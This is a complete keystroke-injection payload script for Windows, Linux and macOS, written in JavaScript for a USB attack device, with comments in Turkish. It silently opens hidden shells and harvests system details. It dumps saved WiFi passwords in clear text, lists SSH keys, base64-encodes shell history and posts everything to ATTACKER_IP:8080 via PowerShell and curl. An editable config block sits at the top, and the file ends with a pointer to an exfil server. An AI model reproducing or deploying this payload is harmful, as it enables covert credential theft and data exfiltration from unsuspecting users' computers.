// ═══════════════════════════════════════════════════════════════════════════
// Payload: exfil_generic.js
// Target:  Windows / Linux / macOS
// Time:    ~15 seconds
// Author:  MoMo-Mimic Team
// ═══════════════════════════════════════════════════════════════════════════
// 
// Açıklama: Cross-platform veri sızdırma
// Sistem bilgisi, credential, dosya toplama
// 
// ═══════════════════════════════════════════════════════════════════════════

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ CONFIGURATION - CHANGE THESE VALUES                                     │
// └─────────────────────────────────────────────────────────────────────────┘
var EXFIL_URL = "http://ATTACKER_IP:8080/upload";   // HTTP POST endpoint
var SAVE_LOCAL = true;                               // Lokale de kaydet

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ SETTINGS                                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
layout("us");
typingSpeed(0, 0);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 1: INITIALIZATION                                                  │
// └─────────────────────────────────────────────────────────────────────────┘
delay(2000);

// ═══════════════════════════════════════════════════════════════════════════
// WINDOWS EXFILTRATION
// ═══════════════════════════════════════════════════════════════════════════
press("GUI-r");
delay(500);
type("powershell -w hidden -ep bypass");
press("ENTER");
delay(1500);

// Windows data collection script
type("$d = @{}; ");
type("$d.OS = 'Windows'; ");
type("$d.Hostname = $env:COMPUTERNAME; ");
type("$d.User = $env:USERNAME; ");
type("$d.Domain = $env:USERDOMAIN; ");
type("$d.IP = (Get-NetIPAddress -AddressFamily IPv4 | Select -First 1).IPAddress; ");
press("ENTER");
delay(500);

// WiFi passwords
type("$wifi = @(); (netsh wlan show profiles) | Select-String ':\\s*(.+)$' | %{ ");
type("$n=$_.Matches.Groups[1].Value.Trim(); ");
type("$p=(netsh wlan show profile name=$n key=clear) | Select-String 'Key Content\\s*:\\s*(.+)$'; ");
type("if($p){$wifi += \"$n : \" + $p.Matches.Groups[1].Value.Trim()}}; ");
type("$d.WiFi = $wifi -join \"`n\"; ");
press("ENTER");
delay(1000);

// Browser history paths
type("$d.ChromePath = Test-Path \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\"; ");
type("$d.FirefoxPath = Test-Path \"$env:APPDATA\\Mozilla\\Firefox\"; ");
press("ENTER");
delay(300);

// Save and exfil
type("$json = $d | ConvertTo-Json; ");
type("$json | Out-File $env:TEMP\\exfil.json -Encoding UTF8; ");
press("ENTER");
delay(500);

if (EXFIL_URL !== "") {
    type("try { Invoke-WebRequest -Uri '" + EXFIL_URL + "' -Method POST -Body $json -ContentType 'application/json' } catch {}");
    press("ENTER");
    delay(1000);
}

type("exit");
press("ENTER");

delay(1000);

// ═══════════════════════════════════════════════════════════════════════════
// LINUX EXFILTRATION
// ═══════════════════════════════════════════════════════════════════════════
press("CTRL-ALT-t");
delay(1000);

// Linux data collection
type("(echo '{'; ");
type("echo '\"OS\": \"Linux\",'; ");
type("echo '\"Hostname\": \"'$(hostname)'\",'; ");
type("echo '\"User\": \"'$(whoami)'\",'; ");
type("echo '\"IP\": \"'$(hostname -I | awk '{print $1}')'\",'; ");
type("echo '\"Kernel\": \"'$(uname -r)'\",'; ");
type("echo '\"Groups\": \"'$(groups)'\",'; ");
type("echo '\"Sudo\": \"'$(sudo -n true 2>/dev/null && echo yes || echo no)'\",'; ");
type("echo '\"SSHKeys\": \"'$(ls ~/.ssh/*.pub 2>/dev/null | tr '\\n' ' ')'\",'; ");
type("echo '\"History\": \"'$(tail -20 ~/.bash_history 2>/dev/null | base64 -w0)'\"'; ");
type("echo '}') > /tmp/.exfil.json 2>/dev/null; ");
press("ENTER");
delay(1000);

if (EXFIL_URL !== "") {
    type("curl -X POST -H 'Content-Type: application/json' -d @/tmp/.exfil.json " + EXFIL_URL + " 2>/dev/null; ");
    press("ENTER");
    delay(1000);
}

type("exit");
press("ENTER");

delay(1000);

// ═══════════════════════════════════════════════════════════════════════════
// MACOS EXFILTRATION
// ═══════════════════════════════════════════════════════════════════════════
press("GUI-SPACE");
delay(500);
type("terminal");
press("ENTER");
delay(1500);

// macOS data collection
type("(echo '{'; ");
type("echo '\"OS\": \"macOS\",'; ");
type("echo '\"Hostname\": \"'$(hostname)'\",'; ");
type("echo '\"User\": \"'$(whoami)'\",'; ");
type("echo '\"Version\": \"'$(sw_vers -productVersion)'\",'; ");
type("echo '\"IP\": \"'$(ipconfig getifaddr en0)'\",'; ");
type("echo '\"WiFiSSID\": \"'$(networksetup -getairportnetwork en0 | cut -d: -f2 | xargs)'\",'; ");
type("echo '\"InstalledApps\": \"'$(ls /Applications | tr '\\n' ',' | head -c 500)'\"'; ");
type("echo '}') > /tmp/.exfil.json 2>/dev/null; ");
press("ENTER");
delay(1000);

if (EXFIL_URL !== "") {
    type("curl -X POST -H 'Content-Type: application/json' -d @/tmp/.exfil.json " + EXFIL_URL + " 2>/dev/null; ");
    press("ENTER");
    delay(1000);
}

type("exit");
press("ENTER");

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ OUTPUT                                                                   │
// └─────────────────────────────────────────────────────────────────────────┘
// Windows: %TEMP%\exfil.json
// Linux:   /tmp/.exfil.json
// macOS:   /tmp/.exfil.json
// 
// Exfil server başlat:
// python3 scripts/exfil_server.py -p 8080

